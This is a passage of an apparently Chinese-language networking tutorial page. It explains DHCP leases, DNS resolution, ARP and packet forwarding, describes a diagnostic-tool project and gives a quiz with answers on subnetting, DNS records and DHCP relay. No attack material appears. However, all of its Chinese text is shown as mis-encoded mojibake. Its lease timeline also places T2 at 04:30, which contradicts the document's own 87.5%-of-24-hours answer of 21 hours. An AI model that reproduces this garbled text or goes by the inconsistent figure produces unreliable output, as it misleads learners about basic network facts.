æœåŠ¡å™¨ç¡®è®¤ï¼š<span class="hljs-string">&quot;å¥½çš„ï¼Œåˆ†é…ç»™ä½ äº†ï¼&quot;</span><br><br>æ—¶é—´çº¿ï¼š<br><span class="hljs-attribute">t</span><span class="hljs-operator">=</span><span class="hljs-number">0</span>ms    å®¢æˆ·ç«¯å‘é€Discover<br><span class="hljs-attribute">t</span><span class="hljs-operator">=</span><span class="hljs-number">10</span>ms   æœåŠ¡å™¨å“åº”Offer<br><span class="hljs-attribute">t</span><span class="hljs-operator">=</span><span class="hljs-number">15</span>ms   å®¢æˆ·ç«¯å‘é€Request<br><span class="hljs-attribute">t</span><span class="hljs-operator">=</span><span class="hljs-number">20</span>ms   æœåŠ¡å™¨å‘é€Ack<br>         âœ… å®¢æˆ·ç«¯é…ç½®å®Œæˆï¼Œå¯ä»¥ä¸Šç½‘<br></code></pre></td></tr></table></figure><p><strong>DHCPé…ç½®å†…å®¹</strong>ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dns">å¿…éœ€é…ç½®ï¼š<br>â”œâ”€â”€ IPåœ°å€          <span class="hljs-number">192.168.1.100</span><br>â”œâ”€â”€ å­ç½‘æ©ç         <span class="hljs-number">255.255.255.0</span><br>â””â”€â”€ ç§Ÿçº¦æ—¶é—´        <span class="hljs-number">86400</span>ç§’ (<span class="hljs-number">24</span>å°æ—¶)<br><br>å¯é€‰é…ç½®ï¼š<br>â”œâ”€â”€ é»˜è®¤ç½‘å…³        <span class="hljs-number">192.168.1.1</span><br>â”œâ”€â”€ DNSæœåŠ¡å™¨       <span class="hljs-number">8.8.8.8</span>, <span class="hljs-number">8.8.4.4</span><br>â”œâ”€â”€ åŸŸå            example.com<br>â””â”€â”€ å…¶ä»–å‚æ•°        NTPæœåŠ¡å™¨ã€WINSæœåŠ¡å™¨ç­‰<br></code></pre></td></tr></table></figure><p><strong>ç§Ÿçº¦æ—¶é—´ç®¡ç†</strong>ï¼š</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs subunit">ç§Ÿçº¦å‘¨æœŸï¼š24å°æ—¶ (86400ç§’)<br><br>æ—¶é—´ç‚¹ï¼š<br>0%        å¼€å§‹æ—¶é—´ï¼š2024<span class="hljs-string">-01</span><span class="hljs-string">-15</span> 10:00:00<br>          â†“<br>50%       T1ç»­çº¦ï¼š  2024<span class="hljs-string">-01</span><span class="hljs-string">-15</span> 22:00:00<br>          (ç›´æ¥è”ç³»åŸDHCPæœåŠ¡å™¨)<br>          â†“<br>87.5%     T2é‡ç»‘ï¼š  2024<span class="hljs-string">-01</span><span class="hljs-string">-16</span> 04:30:00<br>          (å¹¿æ’­å¯»æ‰¾ä»»ä½•DHCPæœåŠ¡å™¨)<br>          â†“<br>100%      åˆ°æœŸæ—¶é—´ï¼š2024<span class="hljs-string">-01</span><span class="hljs-string">-16</span> 10:00:00<br>          (é‡Šæ”¾IPï¼Œé‡æ–°DORA)<br></code></pre></td></tr></table></figure><hr><h2 id="ğŸ”—-çŸ¥è¯†ä¸²è”">ğŸ”— çŸ¥è¯†ä¸²è”</h2><p>è®©æˆ‘ä»¬æŠŠè¿™ä¸€å‘¨çš„çŸ¥è¯†ä¸²è”èµ·æ¥ï¼Œçœ‹çœ‹å®ƒä»¬å¦‚ä½•ååŒå·¥ä½œï¼š</p><h3 id="åœºæ™¯ï¼šä½ çš„ç”µè„‘å¦‚ä½•è®¿é—®-www-baidu-com">åœºæ™¯ï¼šä½ çš„ç”µè„‘å¦‚ä½•è®¿é—® <a href="http://www.baidu.com">www.baidu.com</a></h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs dns">æ­¥éª¤<span class="hljs-number">1</span>ï¼šè·å–ç½‘ç»œé…ç½® (DHCP)<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br>å¼€æœº â†’ DHCP DORAè¿‡ç¨‹<br>     â†“<br>è·å¾—é…ç½®ï¼š<br>- IPåœ°å€ï¼š<span class="hljs-number">192.168.1.100</span><br>- å­ç½‘æ©ç ï¼š<span class="hljs-number">255.255.255.0</span><br>- ç½‘å…³ï¼š<span class="hljs-number">192.168.1.1</span><br>- DNSï¼š<span class="hljs-number">8.8.8.8</span><br><br>æ­¥éª¤<span class="hljs-number">2</span>ï¼šDNSåŸŸåè§£æ<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br>æµè§ˆå™¨è¾“å…¥ï¼šwww.baidu.com<br>     â†“<br>æŸ¥è¯¢æœ¬åœ°DNSç¼“å­˜<br>     â†“ (æœªå‘½ä¸­)<br>æœ¬åœ°DNS â†’ é€’å½’æŸ¥è¯¢<br>     â†“<br>å¾—åˆ°IPï¼š<span class="hljs-number">110.242.68.66</span><br><br>æ­¥éª¤<span class="hljs-number">3</span>ï¼šåˆ¤æ–­æ˜¯å¦åŒä¸€å­ç½‘<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br>ç›®æ ‡IPï¼š<span class="hljs-number">110.242.68.66</span><br>æœ¬æœºIPï¼š<span class="hljs-number">192.168.1.100</span>/<span class="hljs-number">24</span><br>æœ¬æœºç½‘ç»œï¼š<span class="hljs-number">192.168.1.0</span><br><br><span class="hljs-number">110.242.68.66</span> âˆ‰ <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br>     â†“<br>éœ€è¦é€šè¿‡ç½‘å…³è½¬å‘<br><br>æ­¥éª¤<span class="hljs-number">4</span>ï¼šARPè·å–ç½‘å…³MACåœ°å€<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br>éœ€è¦å‘é€ç»™ï¼š<span class="hljs-number">192.168.1.1</span>ï¼ˆç½‘å…³ï¼‰<br>     â†“<br>æŸ¥è¯¢ARPç¼“å­˜<br>     â†“ (æœªå‘½ä¸­)<br>å¹¿æ’­ARPè¯·æ±‚ï¼š&quot;<span class="hljs-number">192.168.1.1</span>çš„MACæ˜¯ä»€ä¹ˆï¼Ÿ&quot;<br>     â†“<br>æ”¶åˆ°ARPå“åº”ï¼š&quot;MACæ˜¯aa:bb:cc:dd:ee:ff&quot;<br>     â†“<br>æ›´æ–°ARPç¼“å­˜<br><br>æ­¥éª¤<span class="hljs-number">5</span>ï¼šå°è£…æ•°æ®åŒ…å¹¶å‘é€<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br>åº”ç”¨å±‚ï¼šHTTPè¯·æ±‚ GET / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br>     â†“<br>ä¼ è¾“å±‚ï¼šTCPæ®µ (æºç«¯å£:<span class="hljs-number">54321</span> â†’ ç›®æ ‡ç«¯å£:<span class="hljs-number">80</span>)<br>     â†“<br>ç½‘ç»œå±‚ï¼šIPåŒ…<br>        æºIP: <span class="hljs-number">192.168.1.100</span><br>        ç›®æ ‡IP: <span class="hljs-number">110.242.68.66</span><br>     â†“<br>é“¾è·¯å±‚ï¼šä»¥å¤ªç½‘å¸§<br>        æºMAC: ä½ çš„ç”µè„‘MAC<br>        ç›®æ ‡MAC: aa:bb:cc:dd:ee:ff (ç½‘å…³MAC)<br>     â†“<br>å‘é€åˆ°ç½‘å…³<br><br>æ­¥éª¤<span class="hljs-number">6</span>ï¼šç½‘å…³è½¬å‘<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br>ç½‘å…³æ”¶åˆ°æ•°æ®åŒ…<br>     â†“<br>æŸ¥çœ‹ç›®æ ‡IPï¼š<span class="hljs-number">110.242.68.66</span><br>     â†“<br>æŸ¥è¯¢è·¯ç”±è¡¨ï¼Œæ‰¾åˆ°ä¸‹ä¸€è·³<br>     â†“<br>è½¬å‘ç»™è¿è¥å•†è·¯ç”±å™¨<br>     â†“<br>... ç»è¿‡å¤šä¸ªè·¯ç”±å™¨ ...<br>     â†“<br>åˆ°è¾¾ç™¾åº¦æœåŠ¡å™¨<br><br>æ­¥éª¤<span class="hljs-number">7</span>ï¼šæ¥æ”¶å“åº”<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br>ç™¾åº¦æœåŠ¡å™¨å¤„ç†è¯·æ±‚<br>     â†“<br>è¿”å›HTTPå“åº”<br>     â†“<br>... åŸè·¯è¿”å› ...<br>     â†“<br>åˆ°è¾¾ä½ çš„ç”µè„‘<br>     â†“<br>æµè§ˆå™¨æ˜¾ç¤ºç½‘é¡µ âœ…<br></code></pre></td></tr></table></figure><h3 id="å®Œæ•´çš„ç½‘ç»œå±‚åè®®æ ˆ">å®Œæ•´çš„ç½‘ç»œå±‚åè®®æ ˆ</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs scss">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚         åº”ç”¨å±‚                          â”‚<br>â”‚    HTTPã€FTPã€SMTPã€DNS                â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚         ä¼ è¾“å±‚                          â”‚<br>â”‚    TCP (ç«¯å£)ã€UDP (ç«¯å£)              â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚         ç½‘ç»œå±‚                          â”‚<br>â”‚    IP (åœ°å€)ã€ICMPã€ARP                â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚         é“¾è·¯å±‚                          â”‚<br>â”‚    ä»¥å¤ªç½‘ (MACåœ°å€)ã€WiFi              â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚         ç‰©ç†å±‚                          â”‚<br>â”‚    ç”µä¿¡å·ã€å…‰ä¿¡å·ã€æ— çº¿ç”µæ³¢            â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><hr><h2 id="ğŸ’»-ç»¼åˆå®æˆ˜é¡¹ç›®">ğŸ’» ç»¼åˆå®æˆ˜é¡¹ç›®</h2><h3 id="é¡¹ç›®ï¼šç½‘ç»œé…ç½®è¯Šæ–­å·¥å…·">é¡¹ç›®ï¼šç½‘ç»œé…ç½®è¯Šæ–­å·¥å…·</h3><p>åˆ›å»ºä¸€ä¸ªç»¼åˆå·¥å…·ï¼Œæ•´åˆæœ¬å‘¨æ‰€å­¦çŸ¥è¯†ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ç»¼åˆè¯Šæ–­</span><br>python week02_network_diagnostic.py --full<br><br><span class="hljs-comment"># å•é¡¹æ£€æŸ¥</span><br>python week02_network_diagnostic.py --check-ip<br>python week02_network_diagnostic.py --check-dns<br>python week02_network_diagnostic.py --check-gateway<br></code></pre></td></tr></table></figure><p><strong>é¡¹ç›®ä»£ç </strong>ï¼šè§ <code>code/week02/week02_network_diagnostic.py</code></p><p><strong>åŠŸèƒ½æ¸…å•</strong>ï¼š</p><ol><li>âœ… æ˜¾ç¤ºæœ¬æœºIPé…ç½®ï¼ˆIPã€æ©ç ã€ç½‘å…³ã€DNSï¼‰</li><li>âœ… åˆ†æIPåœ°å€ç±»å‹ï¼ˆå…¬æœ‰/ç§æœ‰ã€ç±»åˆ«ï¼‰</li><li>âœ… è®¡ç®—å­ç½‘ä¿¡æ¯ï¼ˆç½‘ç»œåœ°å€ã€å¹¿æ’­åœ°å€ã€å¯ç”¨ä¸»æœºï¼‰</li><li>âœ… æŸ¥çœ‹ARPç¼“å­˜</li><li>âœ… æ‰«æç½‘å…³å¯è¾¾æ€§</li><li>âœ… æµ‹è¯•DNSè§£æ</li><li>âœ… æ˜¾ç¤ºDHCPç§Ÿçº¦ä¿¡æ¯</li><li>âœ… æ£€æŸ¥å¸¸ç”¨ç«¯å£</li><li>âœ… ç½‘ç»œè¿é€šæ€§æµ‹è¯•</li><li>âœ… ç”Ÿæˆè¯Šæ–­æŠ¥å‘Š</li></ol><hr><h2 id="ğŸ“-çŸ¥è¯†æµ‹éªŒ">ğŸ“ çŸ¥è¯†æµ‹éªŒ</h2><h3 id="åŸºç¡€é¢˜ï¼ˆæ¯é¢˜10åˆ†ï¼‰">åŸºç¡€é¢˜ï¼ˆæ¯é¢˜10åˆ†ï¼‰</h3><p><strong>1. IPåœ°å€ 172.16.50.100 å±äºå“ªä¸€ç±»ï¼Ÿæ˜¯å…¬æœ‰IPè¿˜æ˜¯ç§æœ‰IPï¼Ÿ</strong></p><details><summary>ç‚¹å‡»æŸ¥çœ‹ç­”æ¡ˆ</summary><ul><li>ç±»åˆ«ï¼šBç±»ï¼ˆç¬¬ä¸€ä¸ªå­—èŠ‚172ï¼Œ10xxxxxxå¼€å¤´ï¼‰</li><li>ç±»å‹ï¼šç§æœ‰IPï¼ˆ172.16.0.0/12 æ˜¯Bç±»ç§æœ‰åœ°å€èŒƒå›´ï¼‰</li></ul></details><p><strong>2. å­ç½‘æ©ç  255.255.255.192 å¯¹åº”çš„CIDRæ˜¯å¤šå°‘ï¼Ÿæœ‰å¤šå°‘ä¸ªå¯ç”¨ä¸»æœºï¼Ÿ</strong></p><details><summary>ç‚¹å‡»æŸ¥çœ‹ç­”æ¡ˆ</summary><ul><li>CIDRï¼š/26</li><li>è®¡ç®—ï¼š255.255.255.192 = 11111111.11111111.11111111.11000000<br>å…±æœ‰26ä¸ª1ï¼Œæ‰€ä»¥æ˜¯/26</li><li>å¯ç”¨ä¸»æœºæ•°ï¼š2^(32-26) - 2 = 2^6 - 2 = 64 - 2 = 62ä¸ª</li></ul></details><p><strong>3. MACåœ°å€ 00:50:56:12:34:56 æ˜¯å“ªä¸ªå‚å•†çš„è®¾å¤‡ï¼Ÿ</strong></p><details><summary>ç‚¹å‡»æŸ¥çœ‹ç­”æ¡ˆ</summary><ul><li>å‚å•†ï¼šVMware</li><li>åˆ¤æ–­ï¼šOUIå‰ç¼€ 00:50:56 å±äºVMware</li></ul></details><p><strong>4. ç«¯å£å· 3306 é€šå¸¸ç”¨äºä»€ä¹ˆæœåŠ¡ï¼Ÿ</strong></p><details><summary>ç‚¹å‡»æŸ¥çœ‹ç­”æ¡ˆ</summary><ul><li>æœåŠ¡ï¼šMySQLæ•°æ®åº“</li><li>é»˜è®¤ç«¯å£ï¼š3306/tcp</li></ul></details><p><strong>5. DNSçš„Aè®°å½•å’ŒCNAMEè®°å½•æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</strong></p><details><summary>ç‚¹å‡»æŸ¥çœ‹ç­”æ¡ˆ</summary><ul><li><p>Aè®°å½•ï¼šç›´æ¥æŒ‡å‘IPv4åœ°å€<br>ç¤ºä¾‹ï¼š<a href="http://www.example.com">www.example.com</a> â†’ 93.184.216.34</p></li><li><p>CNAMEè®°å½•ï¼šæŒ‡å‘å¦ä¸€ä¸ªåŸŸåï¼ˆåˆ«åï¼‰<br>ç¤ºä¾‹ï¼š<a href="http://blog.example.com">blog.example.com</a> â†’ <a href="http://www.example.com">www.example.com</a></p></li><li><p>åŒºåˆ«ï¼š</p><ol><li>Aè®°å½•ç›´æ¥è§£æï¼ŒCNAMEéœ€è¦å†æ¬¡æŸ¥è¯¢</li><li>æ ¹åŸŸååªèƒ½ç”¨Aè®°å½•</li><li>CNAMEä¸èƒ½ä¸å…¶ä»–è®°å½•å…±å­˜</li></ol></li></ul></details><p><strong>6. DHCPçš„T1å’ŒT2åˆ†åˆ«æ˜¯ç§Ÿçº¦æ—¶é•¿çš„å¤šå°‘ï¼Ÿ</strong></p><details><summary>ç‚¹å‡»æŸ¥çœ‹ç­”æ¡ˆ</summary><ul><li>T1ï¼ˆç»­çº¦æ—¶é—´ï¼‰ï¼šç§Ÿçº¦æ—¶é•¿çš„ 50%</li><li>T2ï¼ˆé‡ç»‘æ—¶é—´ï¼‰ï¼šç§Ÿçº¦æ—¶é•¿çš„ 87.5%</li></ul><p>ç¤ºä¾‹ï¼šç§ŸæœŸ24å°æ—¶</p><ul><li>T1 = 12å°æ—¶ï¼ˆç›´æ¥è”ç³»åŸæœåŠ¡å™¨ï¼‰</li><li>T2 = 21å°æ—¶ï¼ˆå¹¿æ’­å¯»æ‰¾ä»»ä½•æœåŠ¡å™¨ï¼‰</li><li>åˆ°æœŸ = 24å°æ—¶ï¼ˆé‡Šæ”¾IPï¼‰</li></ul></details><h3 id="è¿›é˜¶é¢˜ï¼ˆæ¯é¢˜15åˆ†ï¼‰">è¿›é˜¶é¢˜ï¼ˆæ¯é¢˜15åˆ†ï¼‰</h3><p><strong>7. è¯·è®¡ç®—ç½‘ç»œ 192.168.10.0/24 åˆ’åˆ†ä¸º8ä¸ªç­‰å¤§å°å­ç½‘çš„ç»“æœã€‚</strong></p><details><summary>ç‚¹å‡»æŸ¥çœ‹ç­”æ¡ˆ</summary><p>åˆ’åˆ†ä¸º8ä¸ªå­ç½‘ï¼Œéœ€è¦3ä½ï¼ˆ2^3=8ï¼‰<br>æ–°çš„å­ç½‘æ©ç ï¼š/24 + 3 = /27<br>å­ç½‘æ©ç ï¼š255.255.255.224</p><p>8ä¸ªå­ç½‘ï¼š</p><ol><li>192.168.10.0/27   (192.168.10.1 - 192.168.10.30)</li><li>192.168.10.32/27  (192.168.10.33 - 192.168.10.62)</li><li>192.168.10.64/27  (192.168.10.65 - 192.168.10.94)</li><li>192.168.10.96/27  (192.168.10.97 - 192.168.10.126)</li><li>192.168.10.128/27 (192.168.10.129 - 192.168.10.158)</li><li>192.168.10.160/27 (192.168.10.161 - 192.168.10.190)</li><li>192.168.10.192/27 (192.168.10.193 - 192.168.10.222)</li><li>192.168.10.224/27 (192.168.10.225 - 192.168.10.254)</li></ol><p>æ¯ä¸ªå­ç½‘ï¼š30ä¸ªå¯ç”¨ä¸»æœº</p></details><p><strong>8. æè¿°å®Œæ•´çš„ARPè¯·æ±‚å’Œå“åº”è¿‡ç¨‹ï¼ˆåŒ…æ‹¬MACåœ°å€å’ŒIPåœ°å€ï¼‰ã€‚</strong></p><details><summary>ç‚¹å‡»æŸ¥çœ‹ç­”æ¡ˆ</summary><p>åœºæ™¯ï¼šä¸»æœºAè¦ä¸ä¸»æœºBé€šä¿¡</p><p>å·²çŸ¥ä¿¡æ¯ï¼š</p><ul><li>ä¸»æœºAï¼šIP=192.168.1.10, MAC=aa:bb:cc:dd:ee:ff</li><li>ä¸»æœºBï¼šIP=192.168.1.20, MAC=11:22:33:44:55:66</li></ul><p>æ­¥éª¤ï¼š</p><ol><li><p>ARPè¯·æ±‚ï¼ˆå¹¿æ’­ï¼‰ï¼š</p><ul><li>æºMACï¼šaa:bb:cc:dd:ee:ff</li><li>ç›®æ ‡MACï¼šff:ff:ff:ff:ff:ffï¼ˆå¹¿æ’­ï¼‰</li><li>æºIPï¼š192.168.1.10</li><li>ç›®æ ‡IPï¼š192.168.1.20</li><li>è¯¢é—®ï¼šâ€œè°æ˜¯192.168.1.20ï¼Ÿè¯·å‘Šè¯‰192.168.1.10â€</li></ul></li><li><p>ARPå“åº”ï¼ˆå•æ’­ï¼‰ï¼š</p><ul><li>æºMACï¼š11:22:33:44:55:66</li><li>ç›®æ ‡MACï¼šaa:bb:cc:dd:ee:ff</li><li>æºIPï¼š192.168.1.20</li><li>ç›®æ ‡IPï¼š192.168.1.10</li><li>å›ç­”ï¼šâ€œæˆ‘æ˜¯192.168.1.20ï¼Œæˆ‘çš„MACæ˜¯11:22:33:44:55:66â€</li></ul></li><li><p>ä¸»æœºAæ›´æ–°ARPç¼“å­˜è¡¨ï¼š<br>192.168.1.20 â†’ 11:22:33:44:55:66</p></li><li><p>åç»­é€šä¿¡ç›´æ¥ä½¿ç”¨ç¼“å­˜çš„MACåœ°å€</p></li></ol></details><p><strong>9. è§£é‡ŠDNSé€’å½’æŸ¥è¯¢å’Œè¿­ä»£æŸ¥è¯¢çš„åŒºåˆ«ï¼Œå¹¶è¯´æ˜å“ªé‡Œç”¨é€’å½’å“ªé‡Œç”¨è¿­ä»£ã€‚</strong></p><details><summary>ç‚¹å‡»æŸ¥çœ‹ç­”æ¡ˆ</summary><p>é€’å½’æŸ¥è¯¢ï¼ˆRecursive Queryï¼‰ï¼š</p><ul><li>å®šä¹‰ï¼šæŸ¥è¯¢è€…å‘å‡ºè¯·æ±‚åï¼ŒDNSæœåŠ¡å™¨è´Ÿè´£å®Œæˆæ•´ä¸ªæŸ¥è¯¢</li><li>ç‰¹ç‚¹ï¼šâ€œå¸®æˆ‘æŸ¥åˆ°ç»“æœå†å‘Šè¯‰æˆ‘â€</li><li>è¿”å›ï¼šæœ€ç»ˆç­”æ¡ˆæˆ–é”™è¯¯</li></ul><p>è¿­ä»£æŸ¥è¯¢ï¼ˆIterative Queryï¼‰ï¼š</p><ul><li>å®šä¹‰ï¼šDNSæœåŠ¡å™¨åªè¿”å›ä¸‹ä¸€æ­¥åº”è¯¥æŸ¥è¯¢çš„æœåŠ¡å™¨åœ°å€</li><li>ç‰¹ç‚¹ï¼šâ€œæˆ‘ä¸çŸ¥é“ï¼Œä½†ä½ å¯ä»¥å»é—®XXæœåŠ¡å™¨â€</li><li>è¿”å›ï¼šæ¨èæŸ¥è¯¢çš„æœåŠ¡å™¨åœ°å€</li></ul><p>å®é™…åº”ç”¨ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">å®¢æˆ·ç«¯ â†’ æœ¬åœ°DNS   ã€é€’å½’æŸ¥è¯¢ã€‘<br>         â†“<br>æœ¬åœ°DNS â†’ æ ¹DNS     ã€è¿­ä»£æŸ¥è¯¢ã€‘<br>         â†“<br>æœ¬åœ°DNS â†’ TLD<span class="hljs-built_in"> DNS </span>  ã€è¿­ä»£æŸ¥è¯¢ã€‘<br>         â†“<br>æœ¬åœ°DNS â†’ æƒå¨DNS   ã€è¿­ä»£æŸ¥è¯¢ã€‘<br>         â†“<br>æœ¬åœ°DNS â†’ å®¢æˆ·ç«¯    ã€é€’å½’æŸ¥è¯¢ã€‘<br></code></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆè¿™æ ·è®¾è®¡ï¼Ÿ</p><ul><li>å®¢æˆ·ç«¯ç”¨é€’å½’ï¼šç®€å•ï¼Œä¸éœ€è¦å¤šæ¬¡æŸ¥è¯¢</li><li>æœåŠ¡å™¨é—´ç”¨è¿­ä»£ï¼šå‡è½»å•ä¸ªæœåŠ¡å™¨è´Ÿæ‹…ï¼Œé¿å…é€’å½’å¯¼è‡´çš„æ·±åº¦è¿‡æ·±</li></ul></details><p><strong>10. å¦‚æœDHCPæœåŠ¡å™¨åœ¨å¦ä¸€ä¸ªå­ç½‘ï¼Œå¦‚ä½•å®ç°DHCPæœåŠ¡ï¼Ÿ</strong></p><details><summary>ç‚¹å‡»æŸ¥çœ‹ç­”æ¡ˆ</summary><p>é—®é¢˜ï¼šDHCPä½¿ç”¨å¹¿æ’­ï¼Œå¹¿æ’­æ— æ³•è·¨è¶Šè·¯ç”±å™¨</p><p>è§£å†³æ–¹æ¡ˆï¼š<strong>DHCP Relayï¼ˆä¸­ç»§ä»£ç†ï¼‰</strong></p><p>å·¥ä½œåŸç†ï¼š</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[å­ç½‘1: 192.168.1.0/24]</span><br>    â†“ å®¢æˆ·ç«¯å¹¿æ’­Discover<br><span class="hljs-string">[è·¯ç”±å™¨ - DHCP Relay]</span><br>    â†“ å•æ’­è½¬å‘åˆ°DHCPæœåŠ¡å™¨<br><span class="hljs-string">[å­ç½‘2: 192.168.2.0/24 - DHCPæœåŠ¡å™¨]</span><br></code></pre></td></tr></table></figure><p>è¯¦ç»†æµç¨‹ï¼š</p><ol><li>å®¢æˆ·ç«¯åœ¨å­ç½‘1å¹¿æ’­DHCP Discover</li><li>è·¯ç”±å™¨ï¼ˆé…ç½®ä¸ºDHCP Relayï¼‰æ”¶åˆ°</li><li>è·¯ç”±å™¨ä¿®æ”¹æŠ¥æ–‡ï¼š<ul><li>æºIPæ”¹ä¸ºè·¯ç”±å™¨æ¥å£IP (192.168.1.1)</li><li>ç›®æ ‡IPæ”¹ä¸ºDHCPæœåŠ¡å™¨IP (192.168.2.100)ï¼Œå•æ’­</li><li>Gateway IPå­—æ®µå¡«å…¥192.168.1.1</li><li>Hopså­—æ®µåŠ 1</li></ul></li><li>DHCPæœåŠ¡å™¨çœ‹åˆ°Gateway 